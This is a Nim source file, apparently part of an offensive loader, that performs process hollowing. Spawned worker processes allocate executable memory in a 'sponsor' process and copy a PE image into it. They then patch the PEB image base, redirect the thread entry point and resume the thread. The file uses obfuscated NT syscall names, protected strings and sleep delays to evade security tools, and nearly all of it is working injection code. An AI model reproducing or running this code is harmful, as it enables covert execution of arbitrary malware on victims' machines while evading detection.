import os
import winim
import strutils
import ptr_math
import mailslot
import nimprotect
include reloc

# Manager           -> -M
# Allocate          -> -A:<sponsor-process-handle>
# Write             -> -W:<sponsor-process-handle> -N:<new-base-address>
# Thread context    -> -T:<sponsor-thread-handle> -N:<new-base-address>
# Resume            -> -R:<sponsor-thread-handle>

const allocatedAddressMailSlot = protectString("\\\\.\\mailslot\\phaa")


when defined(hollow4):

    proc NtAllocateVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, ZeroBits: ULONG, RegionSize: PSIZE_T, AllocationType: ULONG, Protect: ULONG): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
    # proc NtWriteVirtualMemory(ProcessHandle: HANDLE, BaseAddress: PVOID, Buffer: PVOID, NumberOfBytesToWrite: SIZE_T, NumberOfBytesWritten: PSIZE_T): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
    proc NtGetContextThread(ThreadHandle : HANDLE, Context : PCONTEXT): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
    proc NtSetContextThread(ThreadHandle : HANDLE, Context : PCONTEXT): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}
    proc NtResumeThread(ThreadHandle: HANDLE, SuspendCount: PULONG): NTSTATUS {.stdcall, dynlib: "ntdll", importc.}

    proc allocateMemoryProcess(
        processHandle: Handle, 
        peImageImageBase: PVOID, 
        peImageSize: size_t
    ) =
        var newImageBaseAddress = peImageImageBase
        if NtAllocateVirtualMemory(
            processHandle,
            addr newImageBaseAddress,
            0,
            unsafeAddr peImageSize,
            MEM_COMMIT or MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        ) != 0:
            newImageBaseAddress = NULL
            if NtAllocateVirtualMemory(
                processHandle,
                addr newImageBaseAddress,
                0,
                unsafeAddr peImageSize,
                MEM_COMMIT or MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            ) != 0:
                quit(1)
        
        # Write to the mailslot
        if not writeMailslot(allocatedAddressMailSlot, $cast[int](newImageBaseAddress)):
            quit(1)
        
        # success
        quit(0)


    proc writeMemoryProcess(
        processHandle: Handle,
        newImageBase: PVOID,
        peImageNtHeaders: ptr IMAGE_NT_HEADERS64,
        peImageImageBase: PVOID, 
        peBytesPtr: ptr byte, 
        peImageSizeOfHeaders: size_t, 
        peImageSectionsHeader: ptr IMAGE_SECTION_HEADER   
    ) =

        # Get remote PEB address
        var bi: PROCESS_BASIC_INFORMATION
        var ret: DWORD
        
        if NtQueryInformationProcess(
            processHandle,
            0,
            addr bi,
            cast[windef.ULONG](sizeof(bi)),
            addr ret
        ) != 0:
            quit(1)

        let sponsorPeb = bi.PebBaseAddress

        # Copy PE headers to sponsor process
        if NtWriteVirtualMemory(
            processHandle,
            newImageBase,
            peBytesPtr,
            peImageSizeOfHeaders,
            NULL
        ) != 0: 
            quit(1)

        # Copy PE sections to sponsor process  
        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections) - 1):
            if NtWriteVirtualMemory(
                processHandle,
                newImageBase + peImageSectionsHeader[i].VirtualAddress,
                peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
                peImageSectionsHeader[i].SizeOfRawData,
                NULL
            ) != 0:
                quit(1)
        
        # Overwrite sponsor PEB with the new image base address 
        if NtWriteVirtualMemory(
            processHandle,
            cast[LPVOID](cast[int](sponsorPeb) + 0x10),
            unsafeAddr newImageBase,
            cast[size_t](sizeof(PVOID)),
            NULL
        ) != 0:
            quit(1)

        # Apply relocations
        if not applyRelocations(peBytesPtr, newImageBase, processHandle):
            quit(1)
        
        # success
        quit(0)


    proc setThreadProcess(
        threadHandle: Handle,
        newImageBase: PVOID,
        peImageEntryPoint: PVOID
    ) =
        var context: CONTEXT
        context.ContextFlags = CONTEXT_INTEGER
        if NtGetContextThread(
            threadHandle, 
            addr context
        ) != 0:
            quit(1)
        var entryPoint = cast[DWORD64](newImageBase) + cast[DWORD64](peImageEntryPoint)
        context.Rcx = cast[DWORD64](entryPoint)
        if NtSetContextThread( 
            threadHandle, 
            addr context
        ) != 0:
            quit(1)
        
        # success        
        quit(0)

    proc resumeThreadProcess(
        threadHandle: Handle
    ) =
        if NtResumeThread(
            threadHandle,
            NULL
        ) != 0:
            quit(1)
        
        # success
        quit(0)


when defined(hollow5) or defined(hollow6):

    proc allocateMemoryProcess(
        processHandle: Handle, 
        peImageImageBase: PVOID, 
        peImageSize: size_t
    ) =
        var newImageBaseAddress = peImageImageBase
        if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
            processHandle,
            addr newImageBaseAddress,
            0,
            unsafeAddr peImageSize,
            MEM_COMMIT or MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        ) != 0:
            newImageBaseAddress = NULL
            if CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
                processHandle,
                addr newImageBaseAddress,
                0,
                unsafeAddr peImageSize,
                MEM_COMMIT or MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            ) != 0:
                quit(1)
        
        # Write to the mailslot
        if not writeMailslot(allocatedAddressMailSlot, $cast[int](newImageBaseAddress)):
            quit(1)
        
        # success
        quit(0)


    proc writeMemoryProcess(
        processHandle: Handle,
        newImageBase: PVOID,
        peImageNtHeaders: ptr IMAGE_NT_HEADERS64,
        peImageImageBase: PVOID, 
        peBytesPtr: ptr byte, 
        peImageSizeOfHeaders: size_t, 
        peImageSectionsHeader: ptr IMAGE_SECTION_HEADER   
    ) =

        # Get remote PEB address
        var bi: PROCESS_BASIC_INFORMATION
        var ret: DWORD
        if NtQueryInformationProcess(
            processHandle,
            0,
            addr bi,
            cast[windef.ULONG](sizeof(bi)),
            addr ret
        ) != 0:
            quit(1)

        let sponsorPeb = bi.PebBaseAddress

        # Copy PE headers to sponsor process
        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
            processHandle,
            newImageBase,
            peBytesPtr,
            peImageSizeOfHeaders,
            NULL
        ) != 0: 
            quit(1)
        
        # Copy PE sections to sponsor process  
        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections) - 1):
            if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
                processHandle,
                newImageBase + peImageSectionsHeader[i].VirtualAddress,
                peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
                peImageSectionsHeader[i].SizeOfRawData,
                NULL
            ) != 0:
                quit(1)
        
        # Overwrite sponsor PEB with the new image base address 
        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
            processHandle,
            cast[LPVOID](cast[int](sponsorPeb) + 0x10),
            unsafeAddr newImageBase,
            cast[size_t](sizeof(PVOID)),
            NULL
        ) != 0:
            quit(1)
        
        # success
        quit(0)


    proc setThreadProcess(
        threadHandle: Handle,
        newImageBase: PVOID,
        peImageEntryPoint: PVOID
    ) =
        var context: CONTEXT
        context.ContextFlags = CONTEXT_INTEGER
        if VzpSdkMDEGHOzTpB( # NtGetContextThread
            threadHandle, 
            addr context
        ) != 0:
            quit(1)
        var entryPoint = cast[DWORD64](newImageBase) + cast[DWORD64](peImageEntryPoint)
        context.Rcx = cast[DWORD64](entryPoint)
        if IGyhziwCULdezDSq( # NtSetContextThread
            threadHandle, 
            addr context
        ) != 0:
            quit(1)
        
        # success        
        quit(0)


    proc resumeThreadProcess(
        threadHandle: Handle
    ) =
        if mAcJDfMgbUNFgsxu( # NtResumeThread
            threadHandle,
            NULL
        ) != 0:
            quit(1)
        
        # success
        quit(0)

   
proc createProcessWorker(arg: string, sponsorHandle: HANDLE): PPROCESS_INFORMATION =

    var processCmd = ($GetCommandLineA()).replace(" -M", "") & arg
    
    # Supply RC4 key if needed
    for i in commandLineParams():
        if i.startsWith(protectString("-K:")):
            processCmd = processCmd & " " & i

    var si: STARTUPINFOA
    var pi: PROCESS_INFORMATION
    if CreateProcessA(
        NULL,
        cast[LPSTR](addr processCmd[0]),
        NULL,
        NULL, 
        TRUE,
        0,
        NULL,
        NULL,
        addr si,
        addr pi
    ) != TRUE:
        when not defined(release): echo "[-] Could not create new process"
        onFail(sponsorHandle)     

    return addr pi


proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION, sleepBetweenSteps: int): bool =
    
    # Extract process information
    let sponsorProcessHandle = sponsorProcessInfo.hProcess
    let sponsorThreadHandle = sponsorProcessInfo.hThread
    let sponsorPid = sponsorProcessInfo.dwProcessId
    let sponsorTid = sponsorProcessInfo.dwThreadId
    when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
    when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
    
    # Parse PE
    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
    var peBytesPtr = addr peBytes[0]
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
    
    # Vars to check children processes
    var res: DWORD
    var ppi: PPROCESS_INFORMATION

    # Create a mailslot
    let mailslotHandle = createMailslot(allocatedAddressMailSlot)
    if mailslotHandle == 0:
        onFail(sponsorProcessHandle)

    sleepUselessCalculations(sleepBetweenSteps)

    # Allocate memory in sponsor process
    when not defined(release): echo "[*] Allocating memory in sponsor process"     
    ppi = createProcessWorker(protectString(" -A:") & $sponsorProcessHandle, sponsorProcessHandle)
    WaitForSingleObject(ppi.hProcess, 8 * 1000)
    discard GetExitCodeProcess(ppi.hProcess, addr res)
    if res != 0:
        when not defined(release): echo "[-] Could not allocate memory at sponsor process at address 0x" & $cast[int](peImageImageBase).toHex
        onFail(sponsorProcessHandle)

    # Get the allocated address from the allocator process
    let newImageBaseAddress = cast[PVOID](parseInt(readMailslot(mailslotHandle)))
    when not defined(release): echo "[i] New image base address: 0x" & $cast[int](newImageBaseAddress).toHex 
    
    sleepUselessCalculations(sleepBetweenSteps)

    # Copy PE to sponsor process 
    when not defined(release): echo "[*] Copying PE to sponsor process"
    ppi = createProcessWorker(
        protectString(" -W:") & $sponsorProcessHandle & protectString(" -N:") & $cast[int](newImageBaseAddress), 
        sponsorProcessHandle
        )
    WaitForSingleObject(ppi.hProcess, 8 * 1000)
    discard GetExitCodeProcess(ppi.hProcess, addr res)
    if res != 0:
        when not defined(release): echo "[-] Could not write to sponsor process"
        onFail(sponsorProcessHandle)

    sleepUselessCalculations(sleepBetweenSteps)

    # Change sponsor thread Entrypoint
    when not defined(release): echo "[*] Changing thread context"
    ppi = createProcessWorker(
        protectString(" -T:") & $sponsorThreadHandle & protectString(" -N:") & $cast[int](newImageBaseAddress),
        sponsorProcessHandle
        )
    WaitForSingleObject(ppi.hProcess, 8 * 1000)
    discard GetExitCodeProcess(ppi.hProcess, addr res)
    if res != 0:
        when not defined(release): echo "[-] Could not change thread context"
        onFail(sponsorProcessHandle)

    sleepUselessCalculations(sleepBetweenSteps)
    
    # Resume remote thread 
    when not defined(release): echo "[*] Resuming thread"
    ppi = createProcessWorker(protectString(" -R:") & $sponsorThreadHandle, sponsorProcessHandle)
    WaitForSingleObject(ppi.hProcess, 8 * 1000)
    discard GetExitCodeProcess(ppi.hProcess, addr res)
    if res != 0:
        when not defined(release): echo "[-] Could not resume thread"
        onFail(sponsorProcessHandle)

 
proc hollow456Worker*(peStr: string): bool =

    # Parse PE
    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
    var peBytesPtr = addr peBytes[0]
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
    var peImageSizeOfHeaders = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfHeaders)
    var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
    var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
    var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
    
    # Extract process parameters
    let commandLineParams = commandLineParams()

    # Parse command line args and call to worker functions
    var newImageBase: PVOID
    for i in commandLineParams:
        if i.startsWith(protectString("-N:")):
            newImageBase = cast[PVOID](parseInt(i.replace(protectString("-N:"), "")))
    for i in commandLineParams:
        if i.startsWith(protectString("-A:")):
            allocateMemoryProcess(
                parseInt(i.replace(protectString("-A:"), "")), 
                peImageImageBase, 
                peImageSize
            )
        elif i.startsWith(protectString("-W:")):
            writeMemoryProcess(
                parseInt(i.replace(protectString("-W:"), "")),
                newImageBase,
                peImageNtHeaders, 
                peImageImageBase, 
                peBytesPtr, 
                peImageSizeOfHeaders, 
                peImageSectionsHeader 
            )
        elif i.startsWith(protectString("-T:")):
            setThreadProcess(
                parseInt(i.replace(protectString("-T:"), "")),
                newImageBase,
                peImageEntryPoint
            )
        elif i.startsWith(protectString("-R:")):
            resumeThreadProcess(
                parseInt(i.replace(protectString("-R:"), ""))
            )
    
    # No parameter matched known worker    
    quit(1)
